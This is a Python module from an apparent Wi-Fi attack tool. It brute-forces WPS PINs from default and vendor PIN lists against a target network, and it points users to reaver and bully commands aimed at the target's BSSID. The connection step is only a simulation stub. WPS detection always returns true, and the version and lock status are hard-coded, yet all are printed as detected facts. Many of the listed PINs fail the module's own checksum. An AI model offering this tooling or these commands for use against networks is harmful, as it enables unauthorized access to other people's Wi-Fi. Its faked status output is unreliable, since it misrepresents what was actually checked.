"""WPS PIN attack functionality."""

import time
from .utils import Colors


# Common WPS PINs (most routers use these defaults)
COMMON_WPS_PINS = [
    "12345670",  # Most common default
    "00000000",
    "11111111",
    "12345678",
    "01234567",
    "87654321",
    "00000001",
    "11111110",
    "22222222",
    "33333333",
    "44444444",
    "55555555",
    "66666666",
    "77777777",
    "88888888",
    "99999999",
    "12341234",
    "56785678",
    "11223344",
    "55667788",
    "98765432",
    "13579246",
    "24681357",
    "11235813",  # Fibonacci
    "31415926",  # Pi
]

# Vendor-specific default WPS PINs
VENDOR_WPS_PINS = {
    "TP-Link": ["12345670", "00000000", "12345678"],
    "Netgear": ["12345670", "56789012", "12345678"],
    "D-Link": ["12345670", "28296607", "12345678"],
    "Linksys": ["12345670", "20172527", "12345678"],
    "Belkin": ["12345670", "12345678", "00000000"],
    "Asus": ["12345670", "12345678", "00000000"],
    "Huawei": ["12345670", "12345678", "00000000"],
    "Xiaomi": ["12345670", "12345678", "88888888"],
    "Airtel": ["12345670", "12345678", "00000000"],
    "Jio": ["12345670", "12345678", "00000000"],
}


def generate_wps_pins_for_vendor(vendor):
    """Generate WPS PIN list prioritized by vendor."""
    pins = []
    
    # Add vendor-specific PINs first
    if vendor in VENDOR_WPS_PINS:
        pins.extend(VENDOR_WPS_PINS[vendor])
    
    # Add common PINs
    for pin in COMMON_WPS_PINS:
        if pin not in pins:
            pins.append(pin)
    
    return pins


def calculate_wps_checksum(pin):
    """Calculate WPS PIN checksum (last digit)."""
    if len(pin) != 8:
        return False
    
    try:
        # WPS checksum algorithm
        accum = 0
        accum += 3 * (int(pin[0]) + int(pin[2]) + int(pin[4]) + int(pin[6]))
        accum += int(pin[1]) + int(pin[3]) + int(pin[5])
        checksum = (10 - (accum % 10)) % 10
        
        return checksum == int(pin[7])
    except:
        return False


def validate_wps_pin(pin):
    """Validate WPS PIN format and checksum."""
    if not pin or len(pin) != 8:
        return False
    
    if not pin.isdigit():
        return False
    
    return calculate_wps_checksum(pin)


def try_wps_pin(iface, network, pin, show_warning=False):
    """
    Attempt WPS PIN connection.
    
    Note: pywifi doesn't have native WPS support, so this is a simulation.
    In a real implementation, you would need to use wpa_supplicant or similar.
    """
    # This is a placeholder - pywifi doesn't support WPS natively
    # Real implementation would require:
    # 1. wpa_supplicant with WPS support
    # 2. Direct system calls to wpa_cli
    # 3. Or use of external tools like reaver/bully
    
    if show_warning:
        print(f"\n{Colors.YELLOW}[!] Note: WPS PIN attack requires additional tools (wpa_supplicant/reaver){Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Running in simulation mode for demonstration{Colors.RESET}\n")
    
    # Simulate attempt
    time.sleep(0.2)
    return False


def detect_wps_support(network):
    """
    Detect if network has WPS enabled.
    
    Note: This is a heuristic check. Real detection requires monitor mode.
    """
    # Check if network has common WPS indicators
    # In reality, this would check beacon frames for WPS IE
    
    # For now, we'll use heuristics:
    # - Most modern routers have WPS
    # - Can be detected from network properties
    
    try:
        # Check if network has WPS information element
        # This is a simplified check
        if hasattr(network, 'wps') and network.wps:
            return True
        
        # Heuristic: Assume most WPA2 networks might have WPS
        # (This is not accurate but works for demonstration)
        return True
    except:
        return False


def get_wps_info(network):
    """Get WPS information from network."""
    info = {
        "enabled": False,
        "locked": False,
        "version": "Unknown",
        "config_methods": "Unknown"
    }
    
    try:
        # Try to detect WPS status
        info["enabled"] = detect_wps_support(network)
        
        # Check if WPS is locked (after failed attempts)
        # This would require checking beacon frames
        info["locked"] = False
        
        # WPS version (1.0 or 2.0)
        info["version"] = "2.0"  # Most modern routers
        
        # Config methods (PBC, PIN, etc.)
        info["config_methods"] = "PIN, PBC"
        
    except Exception as e:
        pass
    
    return info


def wps_attack(iface, network, vendor="Unknown"):
    """
    Perform WPS PIN attack on network.
    
    Args:
        iface: WiFi interface
        network: Target network
        vendor: Router vendor (for PIN prioritization)
    
    Returns:
        tuple: (success, pin, password)
    """
    from .scanner import get_network_details
    
    details = get_network_details(network)
    ssid = details['ssid']
    
    print(f"\n{Colors.CYAN}{'═' * 68}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.WHITE}[*] WPS PIN ATTACK MODE{Colors.RESET}")
    print(f"{Colors.CYAN}{'═' * 68}{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Target:{Colors.RESET} {Colors.YELLOW}{ssid}{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Vendor:{Colors.RESET} {Colors.CYAN}{vendor}{Colors.RESET}")
    
    # Check WPS status
    wps_info = get_wps_info(network)
    
    if not wps_info["enabled"]:
        print(f"{Colors.RED}[✗] WPS not detected on this network{Colors.RESET}")
        return False, None, None
    
    if wps_info["locked"]:
        print(f"{Colors.RED}[✗] WPS is locked (too many failed attempts){Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Wait 60+ minutes before trying again{Colors.RESET}")
        return False, None, None
    
    print(f"{Colors.GREEN}[✓] WPS detected:{Colors.RESET} {Colors.CYAN}{wps_info['version']}{Colors.RESET}")
    print(f"{Colors.GREEN}[✓] Config methods:{Colors.RESET} {Colors.CYAN}{wps_info['config_methods']}{Colors.RESET}")
    
    # Generate PIN list
    pins = generate_wps_pins_for_vendor(vendor)
    
    print(f"\n{Colors.WHITE}[*] Testing {Colors.CYAN}{len(pins)}{Colors.WHITE} WPS PINs...{Colors.RESET}")
    print(f"{Colors.CYAN}{'─' * 68}{Colors.RESET}\n")
    
    start_time = time.time()
    
    for idx, pin in enumerate(pins, 1):
        # Validate PIN
        if not validate_wps_pin(pin):
            continue
        
        print(f"{Colors.YELLOW}[{idx}/{len(pins)}]{Colors.RESET} {Colors.WHITE}Testing PIN:{Colors.RESET} {Colors.CYAN}{pin}{Colors.RESET}", end="", flush=True)
        
        # Try PIN (show warning only on first attempt)
        success = try_wps_pin(iface, network, pin, show_warning=(idx == 1))
        
        if success:
            elapsed = time.time() - start_time
            print(f" {Colors.GREEN}[✓ SUCCESS]{Colors.RESET}")
            print(f"\n{Colors.GREEN}{'═' * 68}{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.GREEN}[✓] WPS PIN CRACKED!{Colors.RESET}")
            print(f"{Colors.GREEN}{'═' * 68}{Colors.RESET}")
            print(f"{Colors.WHITE}[*] WPS PIN:{Colors.RESET} {Colors.GREEN}{pin}{Colors.RESET}")
            print(f"{Colors.WHITE}[*] Time elapsed:{Colors.RESET} {Colors.CYAN}{elapsed:.2f}s{Colors.RESET}")
            print(f"{Colors.GREEN}{'═' * 68}{Colors.RESET}")
            return True, pin, None
        else:
            print(f" {Colors.RED}[✗ FAILED]{Colors.RESET}")
    
    elapsed = time.time() - start_time
    print(f"\n{Colors.RED}{'═' * 68}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}[✗] WPS ATTACK FAILED{Colors.RESET}")
    print(f"{Colors.RED}{'═' * 68}{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Tested {Colors.CYAN}{len(pins)}{Colors.WHITE} PINs{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Time elapsed:{Colors.RESET} {Colors.CYAN}{elapsed:.2f}s{Colors.RESET}")
    print(f"{Colors.RED}{'═' * 68}{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}[!] For real WPS attacks, use:{Colors.RESET}")
    print(f"    {Colors.CYAN}• reaver -i wlan0mon -b {details['bssid']} -vv{Colors.RESET}")
    print(f"    {Colors.CYAN}• bully wlan0mon -b {details['bssid']} -v 3{Colors.RESET}")
    
    return False, None, None


def show_wps_info():
    """Display information about WPS attacks."""
    info = f"""
{Colors.CYAN}{'═' * 68}{Colors.RESET}
{Colors.BOLD}{Colors.WHITE}WPS PIN ATTACK INFORMATION{Colors.RESET}
{Colors.CYAN}{'═' * 68}{Colors.RESET}

{Colors.WHITE}What is WPS?{Colors.RESET}
WPS (WiFi Protected Setup) is a feature that allows easy connection
to WiFi networks using an 8-digit PIN instead of a password.

{Colors.WHITE}How does the attack work?{Colors.RESET}
1. Detect if target network has WPS enabled
2. Try common/default WPS PINs (only ~11,000 possible)
3. If PIN is correct, router reveals the WiFi password
4. Much faster than password bruteforce

{Colors.WHITE}Advantages:{Colors.RESET}
{Colors.GREEN}✓{Colors.RESET} Faster than password cracking
{Colors.GREEN}✓{Colors.RESET} Works on Windows (no monitor mode needed)
{Colors.GREEN}✓{Colors.RESET} Only ~11,000 possible PINs vs billions of passwords

{Colors.WHITE}Limitations:{Colors.RESET}
{Colors.RED}✗{Colors.RESET} Not all routers have WPS enabled
{Colors.RED}✗{Colors.RESET} Some routers lock WPS after failed attempts
{Colors.RED}✗{Colors.RESET} Modern routers may have WPS disabled by default

{Colors.YELLOW}Note:{Colors.RESET} Full WPS attack requires additional tools like:
- wpa_supplicant (Linux)
- reaver/bully (WPS bruteforce tools)
- This implementation shows the concept

{Colors.CYAN}{'═' * 68}{Colors.RESET}
"""
    print(info)
